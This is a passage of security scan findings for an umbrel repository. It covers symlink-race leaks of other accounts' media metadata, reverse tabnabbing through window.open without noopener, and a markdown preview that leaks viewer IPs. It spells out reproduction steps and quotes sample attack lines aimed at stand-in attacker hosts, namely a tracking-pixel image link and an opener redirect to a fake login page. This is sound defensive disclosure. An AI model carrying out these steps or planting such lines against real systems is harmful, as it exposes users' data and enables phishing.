6. [packages/umbreld/source/modules/files/file-index-engine.ts:866–890](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L866-L890)
   reconcileRoot sets rerunRequested/rerun on an active or queued reconciliation; #runRootReconciliation loops while rerun is set and a superseded pass skips its delete-unseen step, so each member createDirectory (→ reconcilePath → directory → reconcileRoot) extends the window at will.
7. [packages/umbreld/source/modules/files/file-index-engine.ts:1662–1672](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L1662-L1672)
   ensureThumbnail (on-demand Files/Photos thumbnail request) lstat()s and reconciles the caller path and hands the resulting entry id to the enrichment; files.ts has already returned the unresolved path, so a parent swapped after the realpath check is followed here.
8. [packages/umbreld/source/modules/files/file-index-engine.ts:2031–2051](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L2031-L2051)
   #currentThumbnailEntry / matchesThumbnail compares the lstat() identity of the unresolved path with the row; through a symlinked parent the foreign file's identity matches the row written above, so the engine answers that the foreign content's thumbnail belongs to the member's path.
9. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2185–2230](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2185-L2230)
   entryCandidate/contentCandidate rebuild systemPath as join(root_system_path, relative_path); hashFileRevision and openContentRevision open it with O_NOFOLLOW, which only protects the final component, so BLAKE3 hashing, ImageMagick/ffprobe thumbnailing and exiftool metadata extraction read whatever file the kernel resolves through intermediate symlinks, as root.
10. [packages/umbreld/source/modules/files/file-index-enrichment.ts:430–456](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L430-L456)
   ensureThumbnail's on-demand loop: on StaleFileRevisionError it calls onStalePath(candidate.systemPath) and retries with the refreshed candidate, so a path swap any time before the open is converted into hashing and thumbnailing the swapped-in target rather than a failure.
11. [packages/umbreld/source/modules/files/file-index-enrichment.ts:659–679](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L659-L679)
   The background lane does the same for every pending 'content' entry of home/trash roots (BACKGROUND_ENRICHMENT_ROOT_SQL): stale -> onStalePath -> the row is re-indexed through the symlink and picked up again on the next pass (hash, then thumbnail and media-metadata steps in the same slot).
12. [packages/umbreld/source/modules/files/file-index/paths.ts:12–19](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/paths.ts#L12-L19)
   relativePathWithin is string arithmetic over nodePath.resolve(); it establishes lexical containment only and is the sole containment check the engine applies to system paths.
13. [packages/umbreld/source/modules/photos/repository.ts:587–599](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/repository.ts#L587-L599)
   attachContentHash attributes the newly hashed content to index_roots.owner_id of the entry's root (the member), creating photos_content_state for the member's account (and auto-creating the member's 'umbrel' source with scope 'everything' via #ensureSource); media_metadata (taken_at, camera, GPS latitude/longitude, user_comment) and thumbnails are then produced for that content.
14. [packages/umbreld/source/modules/photos/library-sql.ts:94–116](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/photos/library-sql.ts#L94-L116)
   Photos item visibility is driven solely by entries in the account's home/trash roots joined to contents/media_metadata, so the foreign file surfaces as an item (with EXIF, GPS location, fileName and path in the member-tier photos.items.get) in the member's library for as long as the row exists.
15. [packages/umbreld/source/modules/files/files.ts:1253–1282](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1253-L1282)
   files.rename realpath-validates only the directory being renamed (virtualToSystemPath) and never inspects its contents, so a member may rename a real directory that contains an escaping symlink into the place of a previously indexed real directory; the index is informed through the fire-and-forget movePath.
16. [packages/umbreld/source/modules/files/routes.ts:323–325](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L323-L325)
   unarchive is privateProcedureWithMembers (as are rename at 250, move at 227 and createDirectory at 191): a member account can extract archives into its own home, which is how the escaping symlink is planted (archive.ts:217 runs unar; api.ts:333-334 acknowledges extraction creates symlinks).
17. [packages/umbreld/source/modules/files/files.ts:2199–2231](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2199-L2231)
   Context: virtualToSystemPath checks realpath containment once and deliberately returns the unresolved path. The engine receives that path (thumbnails.ts getThumbnailOnDemand, createDirectory, upload publication) and performs all its own stat/open work on it later without re-validating; the same realpath check is why the symlink itself cannot be moved and the swap must be done at the level of a real parent directory.

## Impact
Cross-account disclosure of metadata about guessed media files of the owner or other members (existence, size, EXIF camera data, GPS coordinates, timestamps, content hash) through the member's own Photos library, plus root generating and storing renditions of those files; full rendition bytes need an additional race. Partial confidentiality loss, no integrity or availability impact.

## Reproduction steps
1. Attacker: authenticated member on the LAN dashboard. Delivery: member-tier tRPC files.upload/unarchive/rename/createDirectory and photos.items.list/get. Steps: upload decoy R/arc/real/A/x.jpg so row E exists and is pending enrichment; extract an archive containing link/A -> victim directory; rename arc/real away and arc/link into its place (the symlink itself is refused by the realpath check, its real parent directory is not); keep the root scan rerunning with createDirectory while the background lane goes stale -> reconcile -> hash/exiftool the victim file; read the Photos list/detail. No race, member-controlled timing, no defence to defeat, but success needs a guessable filename in the victim directory and E still pending at swap time, so AT is PRESENT. Thumbnail bytes additionally need a realpath/lstat race.

## Recommended fix
1. #reconcileSystemPath/#entryWrite/ensureThumbnail/#currentThumbnailEntry accept a system path whose containment was established lexically and stat it with symlink-following semantics for all but the last component, so out-of-root files are recorded under in-root relative paths. Fix criteria: Before writing or matching an entry, the engine establishes that root.systemPath joined with the relative path resolves without traversing any symbolic link (e.g. fs.realpath of the parent equals the lexical parent, or open via openat2 RESOLVE_NO_SYMLINKS/RESOLVE_BENEATH and fstat the descriptor), and rejects or deletes the entry otherwise. Verify: with `<home>/A -> /other/dir` and a file in /other/dir, reconcilePath(<home>/A/x.jpg) and ensureThumbnail(<home>/A/x.jpg) produce no row and no enrichment work.
2. The enrichment reopens entries by join(root_system_path, relative_path) with O_NOFOLLOW on the leaf only, and converts an identity mismatch into a stale-path refresh that re-indexes whatever the path now points to. Fix criteria: Enrichment opens sources with a symlink-free resolution (dirfd/openat2 RESOLVE_BENEATH from the root) and a stale-path refresh never results in a row whose identity comes from a file outside the root. Verify: after swapping a parent for an escaping symlink, the background and on-demand lanes fail the entry (or drop it) instead of hashing/thumbnailing the target, and no photos_content_state/media_metadata is created for it.

---
**Severity:** LOW
**Status:** Open
**Category:** Link following
**CWE:** [CWE-59](https://cwe.mitre.org/data/definitions/59.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258136

---

# Crawler opendir follows a directory swapped for a symlink after lstat, indexing foreign trees

## Details
`walkFileTree` is the engine's only defence against symlinked directories inside an index root: it lstat()s each directory entry and pushes only real directories onto a LIFO stack. But what it pushes is a pathname, and the later `opendir(directory)` (Node `fs.opendir` → `opendir(3)`, no O_NOFOLLOW) re-resolves that pathname through the kernel, following any symlink now at that name. A member can therefore make the root-owned crawler descend into an arbitrary host directory by making the queued pathname resolve through a symbolic link between the lstat and the opendir.

The window is attacker-widened rather than tight: a directory `a/x` is opened only after every sibling pushed after it inside `a` (and each sibling's whole subtree) has been walked, so decoy siblings holding tens of thousands of files give a window of many seconds per pass. The member can start a pass at will (`files.createDirectory` → `reconcilePath` → `#reconcileSystemPath(…, 'root')` → `reconcileRoot('directory-changed')`, engine 1349-1351) and retry indefinitely.

The swap uses only member-tier operations, but not by renaming the symlink itself: `files.rename`/`files.move` authorise the source through `virtualToSystemPath` → `assertSystemPathInsideBase` (files.ts:2199-2231, 2341-2350), whose realpath check rejects a symlink whose target lies outside the member's base. Instead the member (1) uploads and `files.unarchive`s an archive whose entry `x` is a symlink to the target (e.g. `/home/umbrel/umbrel/home`, another member's home, or `/`); unar extracts it into a new real directory `b` (archive.ts:217, no post-extraction symlink stripping — assumes Debian `unar`, installed by umbrelos.Dockerfile:421, materialises symlink entries as it does for tar/zip); (2) creates a real directory `a/x` plus decoy directories under `a`; (3) during the pass, after the crawler has listed `a` and is walking the decoys, renames `a`→`a_old` and `b`→`a`. Both renames pass authorisation because their sources are real directories inside the member's home; `rename(2)` moves the symlink along unexamined. `opendir(<home>/a/x)` now follows the symlink and the crawler enumerates the target.

Every file under the target is written as a row `a/x/<path>` of the member's home root (`#entryWrite` uses the lexical `relativePathWithin`) with the target file's true dev/inode/size/mtime and marked seen (`#writeEntries` markSeen) so the pass's delete-unseen step keeps it. Thumbnail-eligible files get `thumbnail_identity_kind='content'` and `hash_not_before = now+1s`; the background lane reopens `join(root_system_path, relative_path)` with O_NOFOLLOW on the leaf only (enrichment 2185-2216), which follows the still-present intermediate symlink, and the identity check passes because the row already carries the target's identity. Those files are then hashed, thumbnailed (ImageMagick/ffmpeg as root) and EXIF-parsed and become items of the member's Photos library: `photos.items.list` is pure SQL over the member-owned root and exposes fileName, path, width/height, takenAt, camera make/model/lens, user comment and GPS latitude/longitude/altitude (library-sql.ts:103-109). `directorySizes` likewise reports the target tree's total under `a`.

Limits confirmed from the code: Files search/recents, Photos original download and thumbnail serving all re-run `virtualToSystemPath` (realpath) per path and so refuse the swapped rows while the symlink is in place; serving rendition bytes needs the separate realpath-vs-lstat gap in thumbnails.ts. The member's own renames raise watcher 'create' events for a directory, which request a root rerun ('directory-changed'); the current pass therefore skips its delete step, and the rerun pass deletes the `a/x/…` rows unless the member wins the race again in that pass — the leak is repeatable per pass but not permanent.

Related: file-index-reconcile-path-follows-intermediate-symlinks records the per-path (reconcilePath/ensureThumbnail) variant that needs no race but requires filename guessing; this finding is the crawler sink, which needs a race but enumerates the target.

## Evidence
1. [packages/umbreld/source/modules/files/file-index-engine.ts:233–265](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L233-L265)
   walkFileTree classifies each child with lstat() (so a symlink is not descended) and pushes directory pathnames onto a LIFO stack; much later it calls opendir(directory) on the pathname, which follows symlinks (no O_NOFOLLOW / no fd-relative open). A queued directory whose path now resolves through a symlink is descended. The stack discipline makes the window as long as the walk of every sibling subtree pushed after it, which the member controls with decoy directories.
2. [packages/umbreld/source/modules/files/file-index-engine.ts:951–962](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-engine.ts#L951-L962)
   #scanRootSnapshot turns every yielded path into an entry via #entryWrite with the lexical relativePathWithin, so the whole foreign tree is written as `a/x/...` rows of the member's root carrying each target file's real identity, and #writeEntries(..., markSeen=true) protects them from the pass's delete-unseen step.
3. [packages/umbreld/source/modules/files/file-index/paths.ts:12–19](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index/paths.ts#L12-L19)
   relativePathWithin is purely lexical; it is the only containment check applied to crawled paths and cannot distinguish a path that reached the root lexically from one that physically lives elsewhere.
4. [packages/umbreld/source/modules/files/file-index-enrichment.ts:2185–2215](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index-enrichment.ts#L2185-L2215)
   Enrichment reopens each row as join(root_system_path, relative_path) with O_NOFOLLOW on the leaf only; intermediate symlinks are followed, and because the crawler recorded the target file's own identity the revision check passes, so the victim's media is hashed, thumbnailed and EXIF-parsed as root and attributed to the member's account.
5. [packages/umbreld/source/modules/files/files.ts:2199–2231](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2199-L2231)
   virtualToSystemPath + assertSystemPathInsideBase is the member containment control (realpath of the deepest existing path must stay inside the member's base). It is applied to Files API paths — which is why the member must rename the symlink's real parent directory rather than the symlink itself — but never to paths the crawler enumerates, so the crawler path acts around it.
6. [packages/umbreld/source/modules/files/file-index.unit.test.ts:808–835](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/file-index.unit.test.ts#L808-L835)
   The maintainers' guarantee ('never follows symlinks') is tested only for a symlink that already exists when the crawler meets it; the lstat-then-opendir swap is not covered.

## Impact
Cross-account enumeration of another account's (or the host's) directory tree with root parsing the victim's media: directory totals via directorySizes and, through the member's Photos library, file names, paths, dimensions, taken-at, camera and GPS metadata of every image/video under the target. File contents, originals and renditions are refused by the per-path realpath re-checks while the swap is in place, and the rows are deleted by the watcher-triggered rerun unless the race is re-won, so confidentiality impact is partial; no integrity or availability impact.

## Reproduction steps
1. Attacker: authenticated member over the LAN dashboard using member-tier files.unarchive, files.createDirectory and files.rename (all privateProcedureWithMembers). The member plants a symlink inside a real directory via unar extraction (assumption: Debian unar materialises symlink entries), builds a real directory with decoy subtrees, triggers a root scan with createDirectory, and swaps the real parent directory for the one holding the symlink while the crawler is busy with the decoys; the renames pass realpath authorisation because their sources are real directories. The window is seconds and retries are unlimited, but it is still a race the attacker must win and depends on readdir order, so AT is PRESENT. No security mechanism has to be defeated beyond timing.

## Recommended fix
1. walkFileTree re-resolves a queued directory pathname with opendir, which follows a symlink substituted (directly or via a swapped parent) after the lstat classification, so the crawler's symlink exclusion is defeated by a rename race. Fix criteria: Directory descent is bound to the inode the crawler classified: open each queued directory with O_DIRECTORY|O_NOFOLLOW (or openat2 RESOLVE_NO_SYMLINKS / RESOLVE_BENEATH relative to the root descriptor), fstat the descriptor and skip it when dev/ino differ from the lstat result, or iterate via descriptors obtained from the parent handle. Verify that replacing a queued directory, or any of its ancestors, with a path containing a symlink during a scan yields no rows beneath it.
2. Index rows are written and later reopened by lexical root+relative_path without any physical containment check, so once a foreign tree is enumerated it is enriched and surfaced as the member's own. Fix criteria: Before writing or enriching an entry, confirm the physical path is symlink-free beneath the root (realpath equals root + relative_path, or per-component O_NOFOLLOW opens); rows failing the check are dropped rather than hashed, thumbnailed or shown in Photos.

---
**Severity:** LOW
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258135

---

# Cloud OAuth consent tab opened without noopener lets the consent-flow page navigate the dashboard tab

## Details
`useCloudOAuth.begin()` in the Files cloud-connect dialog opens the consent tab with `window.open('', '_blank')` and then assigns `tab.location.href = authorizationUrl`. No `noopener` window feature is passed, and umbreld sends no Cross-Origin-Opener-Policy header for the dashboard (server/index.ts sets only CSP and Referrer-Policy), so every document that subsequently loads in that tab — the OAuth provider's authorisation pages and, after consent, the external redirect page (the 'stateless bouncer'/proxy host where the user copies the authorisation code) — holds a cross-origin `window.opener` reference to the owner's dashboard tab for the lifetime of the flow. A cross-origin opener cannot read the dashboard, but the HTML navigation rules let an auxiliary browsing context navigate its top-level opener: `window.opener.location.replace(url)` (reverse tabnabbing) silently replaces the dashboard tab the owner left open with an attacker page, e.g. a copy of the umbrelOS login asking the owner to re-authenticate.

The parties that gain this capability are remote services outside the device's trust boundary (the OAuth providers and the bouncer host), which the threat model lists as adversaries when controlled or machine-in-the-middled. The project applies the opener-severing control on this very surface in the popup-blocked fallback (`<a target='_blank' rel='noopener noreferrer'>` for the same authorizationUrl in connect-step.tsx) and on its other external `window.open` calls, but not on the primary path, because the handle is kept to close the tab later. The CloudAuth module that fixes the redirect URL (`modules/files/cloud-auth.ts`) is imported by cloud.ts but absent from this checkout; the unit-test fixture models the session with a distinct `redirectUrl` host ('https://proxy.example/callback'). The finding holds on the condition that the redirect target is an externally hosted page (not the device itself) and that neither the provider nor the bouncer document itself sends a COOP header that severs the opener; closing the tab from the dashboard does not require keeping an opener (the bouncer can close itself, or the tab can simply be left open).

## Evidence
1. [packages/ui/src/features/files/hooks/use-cloud.ts:388–418](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/hooks/use-cloud.ts#L388-L418)
   begin() calls window.open('', '_blank') with no 'noopener' feature (line 391) and then assigns tab.location.href = authorizationUrl (line 410). The browsing context created this way keeps window.opener pointing at the dashboard across the cross-origin navigation, so the provider consent pages and the redirect page can call window.opener.location.replace().
2. [packages/ui/src/features/files/hooks/use-cloud.ts:322–326](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/hooks/use-cloud.ts#L322-L326)
   The handle is kept (consentTab) so the dashboard can close the tab later; this is why noopener was omitted, and the opener relationship persists until completion, cancel, expiry or unmount.
3. [packages/ui/src/features/files/components/dialogs/cloud-add-dialog/connect-step.tsx:189](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/dialogs/cloud-add-dialog/connect-step.tsx#L189)
   Production caller of useCloudOAuth. The popup-blocked fallback for the very same authorizationUrl is rendered with rel='noopener noreferrer', showing the project applies the opener-severing control on this surface but not on the primary window.open path.
4. [packages/umbreld/source/modules/server/index.ts:121–137](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L121-L137)
   umbreld's hardening sets only helmet CSP and Referrer-Policy; no Cross-Origin-Opener-Policy header is sent for the dashboard, so the browser does not sever the opener relationship when the consent tab navigates cross-origin.
5. [packages/umbreld/source/modules/files/cloud.ts:636–650](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud.ts#L636-L650)
   authorizationUrl comes from this.auth.beginOAuth in ./cloud-auth.js, which is imported but absent from this checkout, so the exact provider and redirect hosts cannot be verified here.
6. [packages/umbreld/source/modules/files/cloud.unit.test.ts:1446–1456](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud.unit.test.ts#L1446-L1456)
   The OAuth session shape mocked here carries a separate redirectUrl host ('https://proxy.example/callback') distinct from the provider's authorizationUrl, consistent with the UI comment that the provider returns to an external stateless bouncer page rather than to the device.

## Impact
The attacker gains control over what the dashboard tab displays (navigation of the opener to an arbitrary URL), a limited client-side integrity impact. No dashboard data, cookies or tokens are read; credential capture is a subsequent social-engineering step dependent on the owner typing credentials into the replaced page, which the code does not establish.

## Reproduction steps
1. The owner starts 'Connect Google Drive/Dropbox/OneDrive' (or re-authenticates) in Files; the dashboard opens the consent tab with an opener reference and navigates it to the server-supplied authorizationUrl. A page under attacker control in that tab — a compromised or machine-in-the-middled bouncer/provider page — runs window.opener.location.replace('https://attacker/umbrel-login'). The owner returns to the dashboard tab and sees a fake login. Requires the attacker to control a page in the consent flow (AT: PRESENT) and the owner to deliberately start a cloud connection (UI: ACTIVE); no umbrelOS credentials are needed (PR: NONE).

## Recommended fix
1. The consent tab is opened with an opener relationship to the dashboard (window.open without 'noopener', no COOP on the dashboard) so that third-party pages loaded in it can navigate the dashboard window. Fix criteria: Documents loaded during the OAuth consent flow must have no reference to the dashboard window (window.opener === null in the consent tab), e.g. by opening with the 'noopener' feature or nulling the opener before navigating, and the bouncer must close itself rather than relying on the dashboard's handle. Verify that window.opener is null in the consent tab for both the connect and re-authenticate paths and that the dashboard tab cannot be navigated from it.
2. The dashboard does not send a Cross-Origin-Opener-Policy header, so any cross-origin document opened from it retains an opener handle regardless of individual window.open call sites. Fix criteria: Dashboard responses carry a COOP policy that places cross-origin popups in a separate browsing context group (opener severed on cross-origin navigation), verified by observing window.opener === null in a cross-origin tab opened from the dashboard.

---
**Severity:** LOW
**Status:** Open
**Category:** Reverse tabnabbing
**CWE:** [CWE-1022](https://cwe.mitre.org/data/definitions/1022.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258132

---

# Files markdown preview renders remote images from untrusted files, leaking viewer IP to attacker host

## Details
The Files text viewer's markdown preview (`MarkdownPreview`, packages/ui/src/features/files/components/file-viewer/text-viewer/markdown-preview.tsx) renders user files through react-markdown with a denylist that leaves `img` enabled and no urlTransform restricting sources. The content is fetched as text from /api/files/view and rendered as live DOM in the dashboard origin, so the server's own protection for viewing user files — `Content-Security-Policy: sandbox; default-src 'none'` on the /view response, with the comment 'Files are user-controlled' (files/api.ts:537-546) — never applies. The dashboard CSP allows `img-src *`, so when a viewer opens a `.md` file the browser issues a GET to every `![](https://attacker.example/pixel?id=...)` the file contains; the preview is shown by default for markdown files (index.tsx:172), so opening the file is enough.

The attacker position that gains from this is a file author who is not the viewer: a member account writing a `.md` into a folder the owner shared read-write (member-shares.ts: 'Shares grant read-write access'), or any external party whose document the owner saves to the device and opens (SMB, network/cloud sync, downloads). The attacker's host learns the viewer's public IP address, user agent and the exact time the file was opened, and can distinguish victims and files via per-file URLs — a read receipt and deanonymisation primitive against an owner browsing over Tor/Tailscale/remotely. (A third-party app gains nothing here, since its own web UI already runs in the owner's browser.)

Impact is confined to this tracking-pixel style disclosure: `Referrer-Policy: no-referrer` (helmet + meta) keeps the dashboard URL and tokens out of the request, and react-markdown ^9.0.1's default urlTransform (assumed: only http/https/mailto/irc/ircs/xmpp URLs kept, `javascript:`/`data:` dropped; raw HTML rendered as text since no rehype-raw is used) prevents script execution. The project's shared `Markdown` component (components/markdown.tsx:9-11) names exactly this risk — 'tracking pixels' — and forbids images for untrusted markdown; the Files preview is a second renderer that does not follow that policy or the /view sandbox.

## Evidence
1. [packages/ui/src/features/files/components/file-viewer/text-viewer/markdown-preview.tsx:5–41](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/file-viewer/text-viewer/markdown-preview.tsx#L5-L41)
   MarkdownPreview renders file content with react-markdown using a denylist (script, style, iframe, object, embed, form, svg, math, link, meta, base) that leaves `img` enabled; no urlTransform or components override restricts image sources, so `![](https://attacker/pixel)` in the file becomes a live <img src> in the dashboard origin (fix location).
2. [packages/ui/src/features/files/components/file-viewer/text-viewer/index.tsx:172](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/file-viewer/text-viewer/index.tsx#L172)
   showMarkdownPreview is initialised to isMarkdownFile(item.name, item.type), so for .md/.markdown/text/markdown files the preview is visible as soon as the file is opened; no click is needed.
3. [packages/ui/src/features/files/components/file-viewer/text-viewer/index.tsx:756–759](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/features/files/components/file-viewer/text-viewer/index.tsx#L756-L759)
   The content fetched from /api/files/view (line 239, via fetch().text()) is passed verbatim to MarkdownPreview and rendered as DOM, so the CSP headers on the /view response never apply to the rendered output.
4. [packages/umbreld/source/modules/files/api.ts:537–545](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L537-L545)
   The project's shipped control for showing user files in a browser: /api/files/view sets 'Content-Security-Policy: sandbox; default-src none' and nosniff and states 'Files are user-controlled'. The markdown preview bypasses this by re-rendering the same user-controlled content inside the dashboard document instead of the sandboxed response.
5. [packages/umbreld/source/modules/server/index.ts:121–135](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/index.ts#L121-L135)
   The dashboard CSP sets img-src to '*', 'blob:', 'data:', so the browser loads any http(s) image URL the file names; Referrer-Policy no-referrer limits the leak to IP/UA/time.
6. [packages/ui/src/components/markdown.tsx:9–11](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/ui/src/components/markdown.tsx#L9-L11)
   The shared Markdown renderer documents the project's own policy for untrusted markdown — 'Want to avoid any risk of tracking pixels, XSS, etc. NEVER ALLOW IMAGES IN MARKDOWN' — and uses an allowlist without img. The Files preview is a parallel renderer for user-controlled content that does not apply it.

## Impact
Disclosure is limited to the viewer's network identity (public IP), client fingerprint (User-Agent) and read-receipt timing per view; no dashboard data, tokens or file contents leak because Referrer-Policy is no-referrer and react-markdown drops javascript:/data: URLs and renders raw HTML as text (assumption on react-markdown ^9.0.1 defaults). No integrity or availability effect.

## Reproduction steps
1. A member with a read-write share (or anyone whose file the owner stores) writes notes.md containing `![](https://attacker/p?id=victim)`. The owner opens or spacebar-previews the file in Files; TextViewer fetches it and MarkdownPreview mounts with the preview visible by default for markdown. The browser requests the image URL under img-src '*'; the server's /view sandbox CSP does not govern the DOM render, and the shared Markdown allowlist is not used here, so no shipped control intervenes. The victim's only action is opening a stored document, with no prompt or warning to subvert.

## Recommended fix
MarkdownPreview renders user-controlled file content as live DOM in the dashboard origin with `img` permitted and no source restriction, so the file author can make the viewer's browser contact arbitrary remote hosts — sidestepping both the /api/files/view sandbox CSP and the shared Markdown component's no-images policy. Fix criteria: Rendering a markdown file in Files must not cause the browser to request any URL the file author chose on a foreign origin: disallow `img` (as components/markdown.tsx does), or restrict image sources via a urlTransform/components override to same-origin authorised file URLs (e.g. sibling files served through /api/files/view), or render the preview in a sandboxed frame with a CSP that forbids remote img-src. Verify by opening a .md containing a remote image reference and confirming no network request to that host is made.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258131

---

# Shortcut window.open without noopener lets shortcut target site navigate the dashboard tab

## Details
Desktop shortcuts are owner-created links to arbitrary external web pages (the add dialog offers `https://`, plain `http://` and a 'Custom Port' option, so typical targets are LAN devices such as routers, NAS boxes or printers, and public web services). Both places that open a shortcut, the Cmd+K palette entry (`components/cmdk-sources.tsx:573`) and the desktop icon (`modules/desktop/shortcut-icon.tsx:26`), do so with `window.open(url, '_blank')?.focus()`. Because the `noopener` window feature is not passed, the newly opened document gets a `window.opener` reference to the umbrelOS dashboard tab, and per the HTML spec a cross-origin document may assign to `opener.location`.

Attack: the operator of a shortcut's target page, anyone who has compromised that page, or (for the very common plain-HTTP LAN shortcut) an unauthenticated LAN peer performing machine-in-the-middle, serves JavaScript that runs `window.opener.location.replace('https://<attacker>/umbrel-login')`. When the owner clicks the shortcut, the shortcut page opens in a new tab as expected while the original dashboard tab, which the user still believes is umbrelOS, is silently replaced by an attacker page imitating the umbrelOS login/2FA screen (reverse tabnabbing). umbreld sends no `Cross-Origin-Opener-Policy`, so the browser does not sever the opener relationship on its own.

The impact is forced navigation of the owner's dashboard tab to an attacker-chosen URL; credential capture is a follow-on phishing step requiring the user to type. The rest of the UI already treats this as a real concern: every other external link uses `rel='noopener noreferrer'` or `window.open(..., 'noopener,noreferrer')` (settings cmdk-entries.ts:51, settings-content.tsx:337, photos add-source-dialog.tsx:102). The shortcut sinks were left without it, presumably because `noopener` makes `window.open` return `null` and the code wants to call `.focus()` on the handle.

